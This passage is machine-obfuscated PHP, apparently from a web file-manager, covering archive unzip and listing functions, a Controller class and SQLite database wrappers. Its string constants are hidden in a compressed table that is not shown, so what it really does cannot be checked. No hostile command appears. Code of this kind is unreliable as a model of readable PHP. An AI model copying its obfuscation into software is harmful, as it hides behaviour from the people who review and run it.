self::archiveExt(); if (!$a‡‚•¢¿½Š[$dÉ¥‹Œîê…[1064]]) { show_json($dÉ¥‹Œîê…[1065] . $a‡‚•¢¿½Š[$dÉ¥‹Œîê…[1066]], !1); } goto CÎêÔ´Ï†´; CÎêÔ´Ï†´: Hook::trigger($dÉ¥‹Œîê…[1067], $FãÈ¨³°òæ); recursion_dir($FãÈ¨³°òæ, $d„óÎİœÂ‚, $CÊ³¯èÒ¾, 0); $Bª÷±´†æ = array_merge($d„óÎİœÂ‚, $CÊ³¯èÒ¾); goto FÈ‡ÉìŒ¯ß; C±ÊÖ„…“×: if (!@file_exists(self::iconvSystem($fÛÛ”˜Õ†¬))) { $b‹Ú“–¨Ü = self::localFilePath($d‡ÄÎ­©ë, $BŞš ËÊÌ); $fÛÛ”˜Õ†¬ = $b‹Ú“–¨Ü ? $b‹Ú“–¨Ü : parent::download($d‡ÄÎ­©ë, $fÛÛ”˜Õ†¬); } $fÛÛ”˜Õ†¬ = self::iconvSystem($fÛÛ”˜Õ†¬); $aÉñºÕŒ¤Í = isset($bÚŸŒ §‹[$dÉ¥‹Œîê…[1062]]) ? $bÚŸŒ §‹[$dÉ¥‹Œîê…[1062]] : $dÉ¥‹Œîê…[1063]; goto bÌ²¤àòÖ; cºôÂæİ™ç: $bÄ‰‚Ù°¹‹ = self::tmpFileName($cÇø´Æ¥ÎÌ); $FãÈ¨³°òæ = TEMP_FILES . $bÄ‰‚Ù°¹‹; del_dir($FãÈ¨³°òæ); goto d¨·Á “±; B•—‹­é: if (!($cÇø´Æ¥ÎÌ = parent::info($d‡ÄÎ­©ë))) { show_json(LNG($dÉ¥‹Œîê…[1061]), !1); } if (!($DÂí×·õ½ = parent::infoFull($dò¬‹òß))) { $dò¬‹òß = parent::mkdir($dò¬‹òß); $DÂí×·õ½ = array($dÉ¥‹Œîê…[75] => $dò¬‹òß); } else { if (isset($DÂí×·õ½[$dÉ¥‹Œîê…[390]]) && trim($DÂí×·õ½[$dÉ¥‹Œîê…[75]], $dÉ¥‹Œîê…[8]) != trim($dò¬‹òß, $dÉ¥‹Œîê…[8])) { $Cöµ§ÅÃÁ› = KodIO::make($DÂí×·õ½[$dÉ¥‹Œîê…[472]]); $C¬ßÁ»ŞØ‹ = parent::fileNameAuto($Cöµ§ÅÃÁ›, $DÂí×·õ½[$dÉ¥‹Œîê…[28]], REPEAT_RENAME_FOLDER, !0); $dò¬‹òß = parent::mkdir($Cöµ§ÅÃÁ› . $C¬ßÁ»ŞØ‹); $DÂí×·õ½ = array($dÉ¥‹Œîê…[75] => $dò¬‹òß); } } $dò¬‹òß = $DÂí×·õ½[$dÉ¥‹Œîê…[75]]; goto cºôÂæİ™ç; FÈ‡ÉìŒ¯ß: foreach ($Bª÷±´†æ as $a´ã“åÕö‚) { $a´ã“åÕö‚ = self::iconvApp($a´ã“åÕö‚); self::move($a´ã“åÕö‚, $dò¬‹òß, $f² Óõ¶Êª); } del_dir($FãÈ¨³°òæ); if (!$b‹Ú“–¨Ü) { del_file($fÛÛ”˜Õ†¬); } goto B†ğÎøèÛÏ; B†ğÎøèÛÏ: return !0; goto bÎéÁíâŠô; d¨·Á “±: mk_dir($FãÈ¨³°òæ); $BŞš ËÊÌ = self::fileExt($cÇø´Æ¥ÎÌ); $fÛÛ”˜Õ†¬ = $FãÈ¨³°òæ . $dÉ¥‹Œîê…[94] . $BŞš ËÊÌ; goto C±ÊÖ„…“×; bœğîâŒàÒ: $dÉ¥‹Œîê… =& $_SERVER[¹…ÕÄ]; $d‡ÄÎ­©ë = $bÚŸŒ §‹[$dÉ¥‹Œîê…[75]]; $dò¬‹òß = $bÚŸŒ §‹[$dÉ¥‹Œîê…[1060]]; goto B•—‹­é; bÎéÁíâŠô: } public static function unzipList($B¿íáì¦ìö) { goto E–ì¹ÁÉµ„; c§ãƒë¦Ù: $eĞ ºÕêå§ = self::info($e”‘Ã²ËŞ); $DÃ’ò‡…Å = self::fileExt($eĞ ºÕêå§); $AŒÃÊ¢¡ìÍ = self::tmpFileName($eĞ ºÕêå§); goto EÊŠˆÊ§Ê¢; EÊŠˆÊ§Ê¢: if (isset($c²¿„ƒĞÖ¼)) { $B…°¯†ˆ· = array($c²¿„ƒĞÖ¼[$f¹éÒÔáƒø[75]], $c²¿„ƒĞÖ¼[$f¹éÒÔáƒø[1068]], $c²¿„ƒĞÖ¼[$f¹éÒÔáƒø[28]]); $e‚ó¸ÓöÁ¹ = md5(implode($f¹éÒÔáƒø[70], $B…°¯†ˆ·)) . $f¹éÒÔáƒø[94] . get_path_ext($c²¿„ƒĞÖ¼[$f¹éÒÔáƒø[28]]); } else { $B…°¯†ˆ· = array($eĞ ºÕêå§[$f¹éÒÔáƒø[28]], $eĞ ºÕêå§[$f¹éÒÔáƒø[75]], $eĞ ºÕêå§[$f¹éÒÔáƒø[77]]); $e‚ó¸ÓöÁ¹ = md5(implode($f¹éÒÔáƒø[70], $B…°¯†ˆ·)) . $f¹éÒÔáƒø[94] . $DÃ’ò‡…Å; } if ($aŒÕÒÜ£ù == -1) { $D®Æ‘µµÄ = IO_PATH_SYSTEM_TEMP . "\x7a\151\x70\x56\151\x65\167\x2f{$AŒÃÊ¢¡ìÍ}\x2f{$e‚ó¸ÓöÁ¹}\x2e\x6c\157\x67"; $B‘ÆÖÆìò„ = self::infoFull($D®Æ‘µµÄ); if ($B‘ÆÖÆìò„) { $D®Æ‘µµÄ = $B‘ÆÖÆìò„[$f¹éÒÔáƒø[75]]; $AÇóØÚİõÆ = self::getContent($D®Æ‘µµÄ); if ($AÇóØÚİõÆ) { $DŠÅîÇËÈ‡ = json_decode($AÇóØÚİõÆ, !0); if (count($DŠÅîÇËÈ‡) >= $aÊŒ åí–ò) { show_json(sprintf(LNG($f¹éÒÔáƒø[1070]), count($DŠÅîÇËÈ‡)), !1); } return $DŠÅîÇËÈ‡; } } else { $D®Æ‘µµÄ = self::mkfile($D®Æ‘µµÄ); } } $FĞî§Ã‰…œ = TEMP_FILES . $AŒÃÊ¢¡ìÍ; goto f‚ˆ¸ñçµ»; E–ì¹ÁÉµ„: $f¹éÒÔáƒø =& $_SERVER[¹…ÕÄ]; $fãÜçŠŠ«‹ = $B¿íáì¦ìö[$f¹éÒÔáƒø[75]]; $aŒÕÒÜ£ù = isset($B¿íáì¦ìö[$f¹éÒÔáƒø[1068]]) ? $B¿íáì¦ìö[$f¹éÒÔáƒø[1068]] : -1; goto BàŠç¶Ä²; f‚ˆ¸ñçµ»: if (!is_dir($FĞî§Ã‰…œ)) { mk_dir($FĞî§Ã‰…œ); } $Aê¦ƒ·œÙ = $FĞî§Ã‰…œ . $f¹éÒÔáƒø[8] . $e‚ó¸ÓöÁ¹; if (!@file_exists(self::iconvSystem($Aê¦ƒ·œÙ))) { if (isset($c²¿„ƒĞÖ¼)) { url_request($fãÜçŠŠ«‹, $f¹éÒÔáƒø[1071], $Aê¦ƒ·œÙ); } else { $aŸ‹›áø¥¹ = self::localFilePath($fãÜçŠŠ«‹, $DÃ’ò‡…Å); $Aê¦ƒ·œÙ = $aŸ‹›áø¥¹ ? $aŸ‹›áø¥¹ : self::download($fãÜçŠŠ«‹, $Aê¦ƒ·œÙ); } } goto c½„ƒ«°—; c½„ƒ«°—: $Aê¦ƒ·œÙ = self::iconvSystem($Aê¦ƒ·œÙ); if ($aŒÕÒÜ£ù >= 0) { $FÜßËéÎïÃ = isset($B¿íáì¦ìö[$f¹éÒÔáƒø[1072]]) ? $B¿íáì¦ìö[$f¹éÒÔáƒø[1072]] : !1; $Eá’Êèñá = isset($B¿íáì¦ìö[$f¹éÒÔáƒø[28]]) ? $B¿íáì¦ìö[$f¹éÒÔáƒø[28]] : $f¹éÒÔáƒø[33]; KodArchive::filePreview($Aê¦ƒ·œÙ, $aŒÕÒÜ£ù, $FÜßËéÎïÃ, $Eá’Êèñá); self::archiveExt(); die; } $Dóó°âÜÅŠ = KodArchive::listContent($Aê¦ƒ·œÙ); goto bçáìôÁ¿Ï; d®…©‰ê–ğ: $DŠÅîÇËÈ‡ = json_encode($Dóó°âÜÅŠ[$f¹éÒÔáƒø[1066]]); self::setContent($D®Æ‘µµÄ, $DŠÅîÇËÈ‡); if (count($Dóó°âÜÅŠ[$f¹éÒÔáƒø[1066]]) >= $aÊŒ åí–ò) { show_json(sprintf(LNG($f¹éÒÔáƒø[1070]), count($Dóó°âÜÅŠ[$f¹éÒÔáƒø[1066]])), !1); } goto e¢©©øù¾Ì; e¢©©øù¾Ì: return $Dóó°âÜÅŠ[$f¹éÒÔáƒø[1066]]; goto cÇŞËÙëÈÄ; BàŠç¶Ä²: $aÊŒ åí–ò = 50000; if (request_url_safe($fãÜçŠŠ«‹)) { $c²¿„ƒĞÖ¼ = parse_url_query($fãÜçŠŠ«‹); if (!isset($c²¿„ƒĞÖ¼[$f¹éÒÔáƒø[75]])) { show_json($f¹éÒÔáƒø[1069], !1); } } $e”‘Ã²ËŞ = isset($c²¿„ƒĞÖ¼) ? $c²¿„ƒĞÖ¼[$f¹éÒÔáƒø[75]] : $fãÜçŠŠ«‹; goto c§ãƒë¦Ù; bçáìôÁ¿Ï: self::archiveExt(); del_dir($FĞî§Ã‰…œ); if (!$Dóó°âÜÅŠ[$f¹éÒÔáƒø[1064]]) { show_json($Dóó°âÜÅŠ[$f¹éÒÔáƒø[1066]], !1); } goto d®…©‰ê–ğ; cÇŞËÙëÈÄ: } private static function fileExt($E¡Ô˜ãå) { $b»¨Ö••´» =& $_SERVER[¹…ÕÄ]; $EòöÒ‰çŞó = $E¡Ô˜ãå[$b»¨Ö••´»[167]]; if ($EòöÒ‰çŞó == $b»¨Ö••´»[1073]) { $Cæ›Œ­•Û = $b»¨Ö••´»[1074]; if (substr($E¡Ô˜ãå[$b»¨Ö••´»[28]], -strlen($Cæ›Œ­•Û)) == $Cæ›Œ­•Û) { $EòöÒ‰çŞó = $b»¨Ö••´»[1075]; } } self::archiveExt($EòöÒ‰çŞó); return $EòöÒ‰çŞó; } private static function zipFileList($E‚á¶ß®–Î, $a™¤ãùÕ¼‚ = false) { $bå²ÁŒ²Ş¡ =& $_SERVER[¹…ÕÄ]; $D¨á‚Ê«‘ = array(); foreach ($E‚á¶ß®–Î as $C®‹¯‹Á…) { $A÷›÷ÀÕÌ = $C®‹¯‹Á…[$bå²ÁŒ²Ş¡[75]]; if ($a™¤ãùÕ¼‚) { $A÷›÷ÀÕÌ = self::copy($C®‹¯‹Á…[$bå²ÁŒ²Ş¡[75]], $a™¤ãùÕ¼‚, $bå²ÁŒ²Ş¡[764]); } else { $e„‘‹É®Ù = self::init($C®‹¯‹Á…[$bå²ÁŒ²Ş¡[75]]); if ($e„‘‹É®Ù->getType() == $bå²ÁŒ²Ş¡[105]) { $A÷›÷ÀÕÌ = $e„‘‹É®Ù->path; } } if ($A÷›÷ÀÕÌ && self::local()->exist($A÷›÷ÀÕÌ)) { $D¨á‚Ê«‘[$C®‹¯‹Á…[$bå²ÁŒ²Ş¡[75]]] = $A÷›÷ÀÕÌ; } } if (!empty($D¨á‚Ê«‘)) { return array_values($D¨á‚Ê«‘); } show_json(LNG($bå²ÁŒ²Ş¡[1039]), !1); } public static function tmpFileName($bØÕè©æôÊ) { $f‘É‹©…— =& $_SERVER[¹…ÕÄ]; $BšÜìåòñŞ = array($bØÕè©æôÊ[$f‘É‹©…—[28]], $bØÕè©æôÊ[$f‘É‹©…—[75]], $bØÕè©æôÊ[$f‘É‹©…—[77]], $bØÕè©æôÊ[$f‘É‹©…—[481]]); return md5(implode($f‘É‹©…—[70], $BšÜìåòñŞ)); } private static function localFilePath($cœ„ëÆÎ´, $fæ‘¤²é„±) { goto aŒÆ£Úƒò¬; Dé±Â¬§ä: if ($bÒƒÖß÷Ëõ[$fÈ•ƒÍÊ“î[29]] == KodIO::KOD_SOURCE) { $B‰¡Š¦ê¾‹ = Model($fÈ•ƒÍÊ“î[770])->fileInfoGet(KodIO::sourceID($cœ„ëÆÎ´)); if (!$B‰¡Š¦ê¾‹[$fÈ•ƒÍÊ“î[75]]) { show_json($fÈ•ƒÍÊ“î[1078], !1); } $cœ„ëÆÎ´ = $B‰¡Š¦ê¾‹[$fÈ•ƒÍÊ“î[75]]; } $cë¬Œ­ŠÇá = self::init($cœ„ëÆÎ´); $eË—¸µàçì = $cë¬Œ­ŠÇá->getType(); goto F‡ˆ•§¬Àç; F‡ˆ•§¬Àç: if ($eË—¸µàçì == $fÈ•ƒÍÊ“î[105] || $eË—¸µàçì == $fÈ•ƒÍÊ“î[1079]) { if (!$cë¬Œ­ŠÇá->exist($cë¬Œ­ŠÇá->path)) { show_json(LNG($fÈ•ƒÍÊ“î[104]), !1); } return $cë¬Œ­ŠÇá->path; } return !1; goto e‹½±ÈÓÎŠ; aŒÆ£Úƒò¬: $fÈ•ƒÍÊ“î =& $_SERVER[¹…ÕÄ]; if ($fæ‘¤²é„± == $fÈ•ƒÍÊ“î[1076] && strtoupper(substr(PHP_OS, 0, 3)) == $fÈ•ƒÍÊ“î[1077]) { return !1; } $bÒƒÖß÷Ëõ = KodIO::parse($cœ„ëÆÎ´); goto Dé±Â¬§ä; e‹½±ÈÓÎŠ: } private static function archiveExt($CØ¹â·³©Ï = '') { $GLOBALS[$_SERVER[¹…ÕÄ][1080]] = $CØ¹â·³©Ï; } } goto CŒ÷¥…Õ; dóÉº‹Û†Ö: $C–ç…®÷… = $_SERVER[¹…ÕÄ][569]; while ($C–ç…®÷… < $_SERVER[¹…ÕÄ][570]) { if ($C–ç…®÷… >= 0) { break; } $C–ç…®÷…++; } $_SERVER[È] = explode($_SERVER[¹…ÕÄ][571], gzinflate(substr($_SERVER[¹…ÕÄ][572], 10, -8))); goto DÂĞ¼Ğ¥’ƒ; FÄÓ©ª„³: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto cöâÛÅÚÙ©; cöâÛÅÚÙ©: $d‹ßÙî¹œ =& $_SERVER[¹…ÕÄ]; global $in, $config; $this->config =& $config; goto Bù†Êä»¼; A¾ÂÉ¸‘Û: $this->tpl = TEMPLATE . MOD . $d‹ßÙî¹œ[8]; $this->_classObjectID = mt_rand(0, 10000); goto Aˆ›æƒîˆ; Bù†Êä»¼: $this->in =& $in; $this->values[$d‹ßÙî¹œ[6]] =& $config; $this->values[$d‹ßÙî¹œ[7]] =& $in; goto A¾ÂÉ¸‘Û; Aˆ›æƒîˆ: } public function loadClass($d§¶ëÛ¦ªœ) { if (1 === func_num_args()) { $this->{$d§¶ëÛ¦ªœ} = new $d§¶ëÛ¦ªœ(); } else { $B·Î·öé›å = new ReflectionClass($d§¶ëÛ¦ªœ); $bÚß¨ùøæ = func_get_args(); array_shift($bÚß¨ùøæ); $this->{$d§¶ëÛ¦ªœ} = $B·Î·öé›å->newInstanceArgs($bÚß¨ùøæ); } return $this->{$d§¶ëÛ¦ªœ}; } protected function assign($b®Ê¬°†±, $f×É—Æ«š³) { $this->values[$b®Ê¬°†±] = $f×É—Æ«š³; } protected function display($B‘ÕšÁ¿õÏ) { ob_end_clean(); extract($this->values); require $this->tpl . $B‘ÕšÁ¿õÏ; } } class DbSqliteBase extends Db { public function __construct($FŠ×Œó¡ = '') { $aÈƒğÒ‚³Ç =& $_SERVER[¹…ÕÄ]; if (!extension_loaded($aÈƒğÒ‚³Ç[9])) { think_exception(think_lang($aÈƒğÒ‚³Ç[10]) . $aÈƒğÒ‚³Ç[11]); } if (!empty($FŠ×Œó¡)) { if (!isset($FŠ×Œó¡[$aÈƒğÒ‚³Ç[12]])) { $FŠ×Œó¡[$aÈƒğÒ‚³Ç[12]] = 438; } $this->config = $FŠ×Œó¡; if (empty($this->config[$aÈƒğÒ‚³Ç[13]])) { $this->config[$aÈƒğÒ‚³Ç[13]] = array(); } } } public function connect($C‹—¶£öª„ = '', $F¸ğÇùÆá = 0) { $e†œéÉÆÄó =& $_SERVER[¹…ÕÄ]; if (!isset($this->linkID[$F¸ğÇùÆá])) { goto eº¥Ö¬ÑÑ…; d÷Š†™Â£: @sqlite_busy_timeout($this->linkID[$F¸ğÇùÆá], 30000); if (1 != think_config($e†œéÉÆÄó[18])) { unset($this->config); } goto e‰©¯©Êíê; E‡×Ù³‡Õ: $this->linkID[$F¸ğÇùÆá] = $E‡Ìºäƒƒ($C‹—¶£öª„[$e†œéÉÆÄó[17]], $C‹—¶£öª„[$e†œéÉÆÄó[12]]); if (!$this->linkID[$F¸ğÇùÆá]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto d÷Š†™Â£; eº¥Ö¬ÑÑ…: if (empty($C‹—¶£öª„)) { $C‹—¶£öª„ = $this->config; } $A¹àÂ‡é…× = !empty($C‹—¶£öª„[$e†œéÉÆÄó[13]][$e†œéÉÆÄó[14]]) ? $C‹—¶£öª„[$e†œéÉÆÄó[13]][$e†œéÉÆÄó[14]] : $this->pconnect; $E‡Ìºäƒƒ = $A¹àÂ‡é…× ? $e†œéÉÆÄó[15] : $e†œéÉÆÄó[16]; goto E‡×Ù³‡Õ; e‰©¯©Êíê: } return $this->linkID[$F¸ğÇùÆá]; } public function free() { $this->queryID = null; } public function query($EîóîöÅÑÃ) { goto EßĞêŸŒ­; EßĞêŸŒ­: $E İ—œ×´ =& $_SERVER[¹…ÕÄ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d«Æ—ˆ°Éá; DöŠãÊŠÆ„: think_status($E İ—œ×´[20]); $this->queryID = sqlite_query($this->_linkID, $EîóîöÅÑÃ); $this->debug(); goto eˆõÍ¨…î; eˆõÍ¨…î: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Bø ÛÈ¢ª = $this->getAll(); return $Bø ÛÈ¢ª; } goto F¦ç÷ßÎ·Ü; d«Æ—ˆ°Éá: $this->queryStr = $EîóîöÅÑÃ; if ($this->queryID) { $this->free(); } think_action_status($E İ—œ×´[19], 1); goto DöŠãÊŠÆ„; F¦ç÷ßÎ·Ü: } public function execute($D¸”¯°Éâí) { goto EßŒµ¦‚ç; EßŒµ¦‚ç: $EÜÀ‘¥áÜ¨ =& $_SERVER[¹…ÕÄ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto CÃß¬™èÅÂ; C‰ã½‰´ôŒ: if (!1 === $E±ÍŠÏº´) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto CÆÍë¼©¯³; BÇèÛÇ¯«±: think_status($EÜÀ‘¥áÜ¨[20]); $E±ÍŠÏº´ = sqlite_exec($this->_linkID, $D¸”¯°Éâí); $this->debug(); goto C‰ã½‰´ôŒ; CÃß¬™èÅÂ: $this->queryStr = $D¸”¯°Éâí; if ($this->queryID) { $this->free(); } think_action_status($EÜÀ‘¥áÜ¨[21], 1); goto BÇèÛÇ¯«±; CÆÍë¼©¯³: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¹…ÕÄ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bä¿é íÙä = sqlite_query($this->_linkID, $_SERVER[¹…ÕÄ][23]); if (!$bä¿é íÙä) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $EêÊƒÈëî— = sqlite_query($this->_linkID, $_SERVER[¹…ÕÄ][24]); if (!$EêÊƒÈëî—) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $CÌ«¾â®î = array(); if ($this->numRows > 0) { for ($BÖéç¼«Ã£ = 0; $BÖéç¼«Ã£ < $this->numRows; $BÖéç¼«Ã£++) { $CÌ«¾â®î[$BÖéç¼«Ã£] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $CÌ«¾â®î; } public function getFields($d…À·˜›£Š) { $e´£÷Ìİ =& $_SERVER[¹…ÕÄ]; $C¾ŒÛ¥Óï = $this->query($e´£÷Ìİ[25] . $d…À·˜›£Š . $e´£÷Ìİ[26]); $eˆïàÁ‡¬ = array(); if ($C¾ŒÛ¥Óï) { foreach ($C¾ŒÛ¥Óï as $Fõåæäåç” => $eÅ¬”„ñÒÊ) { $eˆïàÁ‡¬[$eÅ¬”„ñÒÊ[$e´£÷Ìİ[27]]] = array($e´£÷Ìİ[28] => $eÅ¬”„ñÒÊ[$e´£÷Ìİ[27]], $e´£÷Ìİ[29] => $eÅ¬”„ñÒÊ[$e´£÷Ìİ[30]], $e´£÷Ìİ[31] => (bool) ($eÅ¬”„ñÒÊ[$e´£÷Ìİ[32]] === $e´£÷Ìİ[33]), $e´£÷Ìİ[34] => $eÅ¬”„ñÒÊ[$e´£÷Ìİ[35]], $e´£÷Ìİ[36] => strtolower($eÅ¬”„ñÒÊ[$e´£÷Ìİ[37]]) == $e´£÷Ìİ[38], $e´£÷Ìİ[39] => strtolower($eÅ¬”„ñÒÊ[$e´£÷Ìİ[40]]) == $e´£÷Ìİ[41]); } } return $eˆïàÁ‡¬; } public function getTables($c±¸É¾Ë… = '') { $DÓÁàĞ£İø =& $_SERVER[¹…ÕÄ]; $B’Êºª ËŞ = $this->query($DÓÁàĞ£İø[42] . $DÓÁàĞ£İø[43] . $DÓÁàĞ£İø[44]); $CÆğğÙí· = array(); foreach ($B’Êºª ËŞ as $b‰”«”Îƒ => $bä§¿˜ ½) { $CÆğğÙí·[$b‰”«”Îƒ] = current($bä§¿˜ ½); } return $CÆğğÙí·; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Aœİ–¾£Ù =& $_SERVER[¹…ÕÄ]; $Aé‡ÄĞ¬Ø = sqlite_last_error($this->_linkID); $this->error = $Aé‡ÄĞ¬Ø . $Aœİ–¾£Ù[4] . sqlite_error_string($Aé‡ÄĞ¬Ø); if ($Aœİ–¾£Ù[33] != $this->queryStr) { $this->error .= LNG($Aœİ–¾£Ù[45]) . $this->queryStr; } think_trace($this->error, $Aœİ–¾£Ù[33], $Aœİ–¾£Ù[46]); return $this->error; } public function escapeString($B¿ğ÷ŒÂ³Ş) { return sqlite_escape_string($B¿ğ÷ŒÂ³Ş); } public function parseLimit($cÈ–¹†²”‚) { $A½åÍ­ÚòŸ =& $_SERVER[¹…ÕÄ]; $dğÒ…¡±á˜ = $A½åÍ­ÚòŸ[33]; if (!empty($cÈ–¹†²”‚)) { $cÈ–¹†²”‚ = explode($A½åÍ­ÚòŸ[47], $cÈ–¹†²”‚); if (count($cÈ–¹†²”‚) > 1) { $dğÒ…¡±á˜ .= $A½åÍ­ÚòŸ[48] . $cÈ–¹†²”‚[1] . $A½åÍ­ÚòŸ[49] . $cÈ–¹†²”‚[0] . $A½åÍ­ÚòŸ[50]; } else { $dğÒ…¡±á˜ .= $A½åÍ­ÚòŸ[48] . $cÈ–¹†²”‚[0] . $A½åÍ­ÚòŸ[50]; } } return $dğÒ…¡±á˜; } } class DbSqlite3Base extends Db { public function __construct($a”‡§¡óãˆ = '') { $DÜ÷ÏëÅ” =& $_SERVER[¹…ÕÄ]; if (!class_exists($DÜ÷ÏëÅ”[51])) { think_exception(think_lang($DÜ÷ÏëÅ”[10]) . $DÜ÷ÏëÅ”[52]); } if (!empty($a”‡§¡óãˆ)) { if (!isset($a”‡§¡óãˆ[$DÜ÷ÏëÅ”[12]])) { $a”‡§¡óãˆ[$DÜ÷ÏëÅ”[12]] = 438; } $this->config = $a”‡§¡óãˆ; if (empty($this->config[$DÜ÷ÏëÅ”[13]])) { $this->config[$DÜ÷ÏëÅ”[13]] = array(); } } } public function connect($BÜ˜³êŒ‚Á = '', $c×¸Ô•Ô¸Š = 0) { $e‘‰†š¦® =& $_SERVER[¹…ÕÄ]; if (!isset($this->linkID[$c×¸Ô•Ô¸Š])) { if (empty($BÜ˜³êŒ‚Á)) { $BÜ˜³êŒ‚Á = $this->config; } $this->linkID[$c×¸Ô•Ô¸Š] = new SQLite3($BÜ˜³êŒ‚Á[$e‘‰†š¦®[17]]); if (!$this->linkID[$c×¸Ô•Ô¸Š]) { think_exception($this->linkID[$c×¸Ô•Ô¸Š]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$c×¸Ô•Ô¸Š]->busyTimeout(30000); if (1 != think_config($e‘‰†š¦®[18])) { unset($this->config); } } return $this->linkID[$c×¸Ô•Ô¸Š]; } public function free() { $this->queryID = null; } public function query($aŠĞèé˜Á) { goto cŒàè’®é¯; Fé„ôß¡«: think_status($C¤•‰Òˆ­ß[20]); $this->queryID = $this->_linkID->query($aŠĞèé˜Á); $this->debug(); goto DÃ†©äÅÎ°; a×áÆøïÕì: $this->queryStr = $aŠĞèé˜Á; if ($this->queryID) { $this->free(); } think_action_status($C¤•‰Òˆ­ß[19], 1); goto Fé„ôß¡«; cŒàè’®é¯: $C¤•‰Òˆ­ß =& $_SERVER[¹…ÕÄ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto a×áÆøïÕì; DÃ†©äÅÎ°: if (!1 === $this->queryID) { $this->error(); return !1; } else { $DÌïøœò¡ = $this->getAll(); $this->numRows = count($DÌïøœò¡); return $DÌïøœò¡; } goto c“ÇëË¦è; c“ÇëË¦è: } public function execute($aäõáÂÇŞŒ) { goto AÏŠÁç¢Äã; A£‡–ÔÂ: if (!1 === $e±ºÃšÎùÑ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto aöÛê¯¹Ù; EéÑªÇÓÒ: think_status($Aæ¶î®ù†Ç[20]); $e±ºÃšÎùÑ = $this->_linkID->exec($aäõáÂÇŞŒ); $this->debug(); goto A£‡–ÔÂ; cÙÆ¼„×Âí: $this->queryStr = $aäõáÂÇŞŒ; if ($this->queryID) { $this->free(); } think_action_status($Aæ¶î®ù†Ç[21], 1); goto EéÑªÇÓÒ; AÏŠÁç¢Äã: $Aæ¶î®ù†Ç =& $_SERVER[¹…ÕÄ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cÙÆ¼„×Âí; aöÛê¯¹Ù: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¹…ÕÄ][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $e‘ÙĞ©„íå = $this->_linkID->query($_SERVER[¹…ÕÄ][23]); if (!$e‘ÙĞ©„íå) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $a‘”‚ÚÊë = $this->_linkID->query($_SERVER[¹…ÕÄ][24]); if (!$a‘”‚ÚÊë) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $e·”êäô = array(); while ($A×’É¸“øÖ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $e·”êäô[] = $A×’É¸“øÖ; } $this->queryID->reset(); return $e·”êäô; } public function getFields($aŸ„ï‡„¿¢) { $eœà—·¼ªÈ =& $_SERVER[¹…ÕÄ]; $cá¹ëÒó·› = $this->query($eœà—·¼ªÈ[25] . $aŸ„ï‡„¿¢ . $eœà—·¼ªÈ[26]); $b¬İª½Âø = array(); if ($cá¹ëÒó·›) { foreach ($cá¹ëÒó·› as $DöË†¨‘‡œ => $b¶ÛÉ‰²øé) { $b¬İª½Âø[$b¶ÛÉ‰²øé[$eœà—·¼ªÈ[28]]] = array($eœà—·¼ªÈ[28] => $b¶ÛÉ‰²øé[$eœà—·¼ªÈ[28]], $eœà—·¼ªÈ[29] => $b¶ÛÉ‰²øé[$eœà—·¼ªÈ[29]], $eœà—·¼ªÈ[31] => (bool) ($b¶ÛÉ‰²øé[$eœà—·¼ªÈ[31]] === $eœà—·¼ªÈ[33]), $eœà—·¼ªÈ[34] => $b¶ÛÉ‰²øé[$eœà—·¼ªÈ[53]], $eœà—·¼ªÈ[36] => (bool) $b¶ÛÉ‰²øé[$eœà—·¼ªÈ[54]], $eœà—·¼ªÈ[39] => (bool) $b¶ÛÉ‰²øé[$eœà—·¼ªÈ[54]]); } } return $b¬İª½Âø; } public function getTables($Cò‡Ñğ¨‰ = '') { $dÔ©‚¼©¯Ÿ =& $_SERVER[¹…ÕÄ]; $Cäæ°ÚÊ¹ = $this->query($dÔ©‚¼©¯Ÿ[42] . $dÔ©‚¼©¯Ÿ[43] . $dÔ©‚¼©¯Ÿ[44]); $b¶Š„íĞÄĞ = array(); foreach ($Cäæ°ÚÊ¹ as $Cô…Ç­ÔÊÖ => $CÑŞÆ…”Ñœ) { $b¶Š„íĞÄĞ[$Cô…Ç­ÔÊÖ] = current($CÑŞÆ…”Ñœ); } return $b¶Š„íĞÄĞ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $EŞÅ›îŒÔ´ =& $_SERVER[¹…ÕÄ]; $this->error = $this->_linkID->lastErrorMsg(); if ($EŞÅ›îŒÔ´[33] != $this->queryStr) { $this->error .= LNG($EŞÅ›îŒÔ´[45]) . $this->queryStr; } think_trace($this->error, $EŞÅ›îŒÔ´[33], $EŞÅ›îŒÔ´[46]); return $this->error; } public function escapeString($e„¢»†ˆãÌ) { $f­õİ‡Î³ã =& $_SERVER[¹…ÕÄ]; if ($this->_linkID) { return $this->_linkID->escapeString($e„¢»†ˆãÌ); } return str_ireplace($f­õİ‡Î³ã[55], $f­õİ‡Î³ã[56], $e„¢»†ˆãÌ); } public function parseLimit($aƒ÷¢‘¯Í¸) { $F´ì¢µ½Ç® =& $_SERVER[¹…ÕÄ]; $aªÑ‡‡ˆ = $F´ì¢µ½Ç®[33]; if 